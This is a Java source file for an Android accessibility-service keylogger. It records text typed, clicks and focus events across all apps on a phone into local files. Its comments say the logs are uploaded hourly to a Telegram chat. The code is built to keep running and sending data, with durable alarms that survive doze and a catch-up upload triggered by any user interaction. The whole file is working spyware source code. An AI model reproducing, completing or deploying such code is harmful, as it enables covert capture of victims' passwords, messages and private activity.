package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Accessibility service that captures text/click/focus events into a local
 * file and uploads that file to a Telegram chat once per hour.
 * No intermediate server, no real-time message spam.
 *
 * Scheduling lives in {@link AlarmScheduler}: the hourly trigger must survive
 * doze, which a Handler chain on the main looper does not.
 */
public class Keylogger extends AccessibilityService {

    private static final String TAG = UploadPipeline.TAG;

    private static final long UPLOAD_INTERVAL_MS = BuildConfig.UPLOAD_INTERVAL_MS;
    private static final int MAX_DATA_CHARS = 500;
    private static final int MAX_TRACKED_WINDOWS = 50;

    // All disk and network work happens here, never on the main thread.
    // Not final: the service instance can be reused after onDestroy reconnects.
    private ExecutorService io = Executors.newSingleThreadExecutor();
    private volatile boolean destroyed;
    // Guards against queueing a burst of catch-up runs while one is in flight.
    private volatile boolean catchingUp;

    /** Returns a live executor, recreating it if a previous onDestroy shut it down. */
    private synchronized ExecutorService io() {
        if (io == null || io.isShutdown()) {
            io = Executors.newSingleThreadExecutor();
        }
        return io;
    }

    private final SimpleDateFormat df =
            new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
    // Main-thread only, used for the daily archive filename.
    private final SimpleDateFormat dayFormat =
            new SimpleDateFormat("yyyyMMdd", Locale.US);
    private final String deviceName = safe(Build.MODEL);
    private final Map<String, String> appLabels = new HashMap<>();

    // Last logged text per window, used to drop redundant prefixes.
    private final Map<String, String> lastTextByWindow = new HashMap<>();

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Starting service");
        destroyed = false;

        // Arm the durable trigger. Rescheduling on every connect is intentional:
        // it also repairs the chain if the process was killed mid-cycle.
        AlarmScheduler.schedule(this);

        io().execute(new Runnable() {
            @Override
            public void run() {
                UploadPipeline.run(Keylogger.this);
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String action;
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                action = "TEXT";
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                action = "CLICKED";
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                action = "FOCUSED";
                break;
            default:
                return;
        }

        AccessibilityNodeInfo source = null;
        try {
            source = event.getSource();

            String app = appLabelOf(event.getPackageName());
            String title = windowTitleOf(event, source);
            String data = eventData(event, source, action, app, title);
            if (data == null) return; // redundant or empty

            String ts = df.format(Calendar.getInstance().getTime());
            final String line = ts + " | " + deviceName + " | " + app + " | " + title
                    + " | " + action + " | " + data + "\n";
            final String archive = "keylog_" + dayStamp() + ".txt";

            io().execute(new Runnable() {
                @Override
                public void run() {
                    File dir = UploadPipeline.logDir(Keylogger.this);
                    UploadPipeline.append(new File(dir, archive), line);
                    UploadPipeline.append(new File(dir, UploadPipeline.PENDING_FILE), line);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "event handling failed", e);
        } finally {
            recycle(source);
        }

        maybeCatchUp();
    }

    /**
     * Fallback for when the alarm never arrives (aggressive OEM power managers,
     * a cancelled alarm after a force-stop). Any user interaction on the phone
     * is enough to flush an overdue cycle, so logs never sit unsent for days.
     */
    private void maybeCatchUp() {
        if (catchingUp) return;
        long last = UploadPipeline.lastRunAt(this);
        if (last > 0 && System.currentTimeMillis() - last < UPLOAD_INTERVAL_MS) return;

        catchingUp = true;
        Log.d(TAG, "overdue upload, running catch-up");
        io().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    UploadPipeline.run(Keylogger.this);
                } catch (Exception e) {
                    Log.e(TAG, "catch-up failed", e);
                } finally {
                    catchingUp = false;
                }
            }
        });
    }

    /**
     * Produces the text payload for one event. Returns null when the event is
     * redundant (a growing text field re-reporting the same prefix) or empty.
     */
    private String eventData(AccessibilityEvent event, AccessibilityNodeInfo source,
                             String action, String app, String title) {
        String clean;
        if ("TEXT".equals(action)) {
            String full = joinText(event);
            if (full.isEmpty()) full = describeNode(source);

            // Identity must include the concrete widget: two text fields in the
            // same screen share app+title, and diffing across them produces garbage.
            String key = app + "|" + title + "|" + widgetKey(event, source);
            String delta = full;
            synchronized (lastTextByWindow) {
                String previous = lastTextByWindow.get(key);
                if (full.equals(previous)) return null;          // nothing changed
                if (previous != null && full.startsWith(previous)) {
                    delta = full.substring(previous.length());     // only the new part
                } else if (previous != null && previous.startsWith(full)) {
                    // Deletion: re-logging the remaining text would duplicate
                    // everything already captured, so record one marker instead.
                    delta = "<backspace>";
                }
                // Cache the FULL text, not the delta, or the next diff is wrong.
                lastTextByWindow.put(key, full);
                if (lastTextByWindow.size() > MAX_TRACKED_WINDOWS) {
                    lastTextByWindow.clear();
                    lastTextByWindow.put(key, full);
                }
            }
            clean = sanitize(delta);
        } else {
            clean = sanitize(describeNode(source));
            if ("-".equals(clean)) clean = sanitize(joinText(event));
        }

        return "-".equals(clean) ? null : clean;
    }

    /** Stable-enough identity for the text field currently being typed into. */
    private static String widgetKey(AccessibilityEvent event, AccessibilityNodeInfo source) {
        StringBuilder sb = new StringBuilder();
        sb.append(event.getWindowId()).append('/');
        CharSequence cls = event.getClassName();
        sb.append(cls == null ? "-" : cls);
        if (source != null) {
            try {
                CharSequence viewId = source.getViewIdResourceName();
                if (viewId != null) sb.append('/').append(viewId);
            } catch (Exception ignored) {
                // View ids are not always available; window+class still helps.
            }
        }
        return sb.toString();
    }

    /** Flattens event.getText() without the List brackets ([a, b] -> a b). */
    private static String joinText(AccessibilityEvent event) {
        java.util.List<CharSequence> parts = event.getText();
        if (parts == null || parts.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (CharSequence p : parts) {
            if (p == null) continue;
            if (sb.length() > 0) sb.append(' ');
            sb.append(p);
        }
        return sb.toString();
    }

    /** Best-effort human label for a clicked/focused widget. */
    private static String describeNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) return text.toString();
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.length() > 0) return desc.toString();
        return "";
    }

    /** Package name resolved to a human-readable app label, cached per package. */
    private String appLabelOf(CharSequence pkg) {
        if (pkg == null) return "unknown";
        final String name = pkg.toString();
        synchronized (appLabels) {
            String cached = appLabels.get(name);
            if (cached != null) return cached;
        }

        String label = name;
        try {
            PackageManager pm = getPackageManager();
            label = pm.getApplicationLabel(pm.getApplicationInfo(name, 0)).toString();
        } catch (Exception e) {
            // Package not visible (API 30+ visibility) or uninstalled; keep the
            // package name rather than guessing. Self packages always resolve.
            Log.d(TAG, "no label for " + name + ": " + e.getClass().getSimpleName());
        }
        label = sanitize(label);

        synchronized (appLabels) {
            if (appLabels.size() > MAX_TRACKED_WINDOWS) appLabels.clear();
            appLabels.put(name, label);
        }
        return label;
    }

    /**
     * Releases a node obtained from {@code event.getSource()}. Recycling is
     * required on API 21-32; on API 33+ it is a no-op. The suppression is
     * scoped to this call because supporting the old range needs the call.
     */
    @SuppressWarnings("deprecation")
    private static void recycle(AccessibilityNodeInfo node) {
        if (node != null) node.recycle();
    }

    /** Releases a window obtained from {@code source.getWindow()} (owned instance). */
    @SuppressWarnings("deprecation")
    private static void recycle(AccessibilityWindowInfo win) {
        if (win != null) win.recycle();
    }

    /** Best-effort window title (API 24+), falling back to the window/activity class. */
    private static String windowTitleOf(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && source != null) {
            AccessibilityWindowInfo win = source.getWindow();
            if (win != null) {
                try {
                    CharSequence t = win.getTitle();
                    if (t != null && t.length() > 0) return sanitize(t.toString());
                } finally {
                    recycle(win);   // getWindow() hands us an owned instance
                }
            }
        }
        CharSequence cls = event.getClassName();
        if (cls != null && cls.length() > 0) return sanitize(cls.toString());
        return "-";
    }

    /** Keeps the pipe-delimited line parseable. */
    private static String sanitize(String s) {
        if (s == null) return "-";
        String out = s.replace('|', '/').replace('\n', ' ').replace('\r', ' ').trim();
        if (out.length() > MAX_DATA_CHARS) out = out.substring(0, MAX_DATA_CHARS) + "...";
        return out.isEmpty() ? "-" : out;
    }

    private static String safe(String s) {
        return (s == null || s.isEmpty()) ? "unknown" : s.replace('|', '/');
    }

    /** Today's date as yyyyMMdd, for the per-day archive filename. */
    private String dayStamp() {
        return dayFormat.format(new Date());
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        destroyed = true;

        // Hand the final rotation to the worker, then close it. shutdown() lets
        // already-submitted writes run; awaiting termination on the main thread
        // would risk an ANR, so the wait happens on a throwaway thread instead.
        final ExecutorService closing = io();
        closing.execute(new Runnable() {
            @Override
            public void run() {
                UploadPipeline.rotatePending(Keylogger.this);
            }
        });
        closing.shutdown();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!closing.awaitTermination(30, TimeUnit.SECONDS)) {
                        closing.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    closing.shutdownNow();
                    Thread.currentThread().interrupt();
                }
            }
        }, "keylogger-shutdown").start();

        super.onDestroy();
    }
}
